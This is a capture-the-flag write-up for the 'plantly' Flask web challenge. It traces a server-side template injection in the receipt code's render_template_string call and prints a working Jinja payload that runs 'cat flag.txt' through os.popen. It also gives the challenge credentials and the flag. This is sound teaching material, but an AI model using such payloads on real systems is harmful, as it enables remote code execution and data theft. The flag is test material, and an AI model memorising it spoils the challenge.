## Name: plantly
#### Author: @HuskyHacks
#### Category: Web
#### Difficulty: Medium
#### Description: We purchased a web dev project off of a gig site to build our new plant subscription service, Plantly. I think the dev was a bit rushed and made some questionable choices. Can you please pentest the app and review the source code? We need to know if there are any major issues before going live! We'll give you the source code so you can run a local instance. We also have a live dev instance so if you find any major vulnerabilities, exploit the live instance and prove it by grabbing the flag! The challenge source code is available in the challenge.zip folder. The password is snyk-ftf-2025. Credentials: testuser1@example.com:password123 and testuser2@example.com:mypassword456 


## Procedure
It gives us two users to login into the website ```testuser1@example.com:password123``` and ```testuser2@example.com:mypassword456```, after login and read the source code, we can find the following interesting code in the file ```challenge/src/app/routes/store.py```.

```
    custom_requests = "".join(
        f"<li>Custom Request: {render_template_string(purchase.custom_request)}</li>" for purchase in purchases if purchase.custom_request
    )

    time_of_purchase = datetime.now()
    template = f"""
    <h2>Plantly Receipt</h2>
    <p><strong>Order Date:</strong> { time_of_purchase }</p>
    <hr>
    <h3>Items Purchased</h3>
    <ul>
        {item_list}
    </ul>
    {custom_requests}
    <hr>
    <p><strong>Subtotal:</strong> ${"{:.2f}".format(subtotal)}</p>
    <p><strong>Tax (10%):</strong> ${"{:.2f}".format(tax)}</p>
    <p><strong>Total:</strong> ${"{:.2f}".format(total)}</p>
    <hr>
    <p>Thank you for your purchase!</p>
    """
```
The value for ```custom_requests``` is added to the source code and then it return ```render_template_string(template)``` with the ```template``` value, to call this we need to access to ```/receipt``` page.
<br>

Now we have to following code
```
 user_id = session["user_id"]
    cart_items = CartItem.query.filter_by(user_id=user_id).all()

    if not cart_items:
        flash("Your cart is empty. Add items before checking out.", "warning")
        return redirect(url_for("store.cart"))

    custom_requests = []
    total_price = 0

    for item in cart_items:
        if item.plant_id is None:
            custom_requests.append(item.custom_request)
            total_price += 0
        else:
            total_price += item.plant.price * item.quantity
```
It does a filter and return every cart item using our user session id, then load every item into ```custom_requests``` and return ```render_template("checkout.html", cart_items=cart_items, custom_requests=custom_requests, ...```.

But when we add a custom note, there is not any validation, this can allow us to use a SSTI attack.
```
    custom_note = None
    if request.method == "POST":
        custom_note = request.form.get("note", "")
        session["custom_note"] = custom_note
        flash("Your custom plant request has been added.", "info")
```

We can test this using a simple payload ```{{config}}```.

![Screenshot 2025-03-05 at 8 20 23 AM](https://github.com/user-attachments/assets/17218ae9-83c6-465a-b5de-01c6c0710e4d)


![Screenshot 2025-03-05 at 8 19 36 AM](https://github.com/user-attachments/assets/124c4d27-a5dd-4c7a-aa9d-43e24ebc3e4a)

We were able to recover the flask config using SSTI attack, from here we can read the flag.txt file or try to get a reverse shell from server
![Screenshot 2025-03-05 at 8 21 12 AM](https://github.com/user-attachments/assets/dce37e50-b126-4e94-9174-77ae4a393cce)

using the following payload we can recover the content for flag.txt file ```{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("cat flag.txt").read() }}```

![Screenshot 2025-03-05 at 8 22 32 AM](https://github.com/user-attachments/assets/2248b8c4-071e-4d9e-acd8-b18989f1a1e0)

![Screenshot 2025-03-05 at 8 22 46 AM](https://github.com/user-attachments/assets/57b5562b-59d9-4552-8be5-ec1d6a5b16cb)


Flag ```flag{982e3b7286ee603d8539f987b65b90d4}```
